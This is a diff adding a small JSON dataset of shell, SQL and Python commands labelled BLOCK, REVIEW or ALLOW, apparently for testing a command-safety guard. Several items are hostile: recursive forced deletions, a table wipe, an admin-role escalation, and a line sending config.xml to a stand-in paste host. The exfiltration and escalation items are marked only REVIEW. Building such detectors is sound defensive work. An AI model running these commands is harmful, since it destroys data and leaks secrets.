@@ -1,0 +1,42 @@
+[
+ [
+  "Remove-Item -Path C:\\ProgramData\\App\\Temp -Recurse -Force",
+  "BLOCK"
+ ],
+ [
+  "Copy-Item C:\\ProgramData\\App\\Temp C:\\Backup\\Temp.bak -Recurse\nRemove-Item -Path C:\\ProgramData\\App\\Temp -Recurse -WhatIf",
+  "REVIEW"
+ ],
+ [
+  "Get-Service -Name 'Worker*' | Select Name, Status",
+  "ALLOW"
+ ],
+ [
+  "DELETE FROM job_history;",
+  "BLOCK"
+ ],
+ [
+  "SELECT COUNT(*) FROM job_history WHERE status = 'failed';",
+  "ALLOW"
+ ],
+ [
+  "import shutil\nshutil.rmtree('/opt/app/cache')",
+  "BLOCK"
+ ],
+ [
+  "Restart-Service -Name 'WorkerService'",
+  "REVIEW"
+ ],
+ [
+  "import requests\nrequests.post('https://pastebin.example/upload', data=open('config.xml').read())",
+  "REVIEW"
+ ],
+ [
+  "UPDATE users SET role = 'admin'",
+  "REVIEW"
+ ],
+ [
+  "Get-ChildItem C:\\Logs -Filter *.log | Select-Object -Last 5",
+  "ALLOW"
+ ]
+]
